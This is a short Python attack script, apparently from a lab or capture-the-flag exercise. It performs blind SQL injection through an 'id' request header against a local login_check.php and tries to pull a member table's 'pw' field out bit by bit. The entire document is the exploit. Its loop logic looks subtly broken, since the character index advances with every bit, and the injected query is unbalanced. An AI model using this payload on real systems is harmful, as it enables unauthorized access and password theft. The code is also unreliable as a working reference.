import urllib3

http = urllib3.PoolManager()


k=1

for x in range(1,8):
	for i in range(1,8):
		
		i=str(i)
		j=str(k)

		http.headers['id'] = "' or (SELECT SUBSTR( LPAD( bin(ord(substr(pw,"+j+",1))), 8,0)," + i + ",1) from member"
		r = http.request('POST','http://127.0.0.1/login_check.php/')

		k=k+1

		print (r.status, r.data)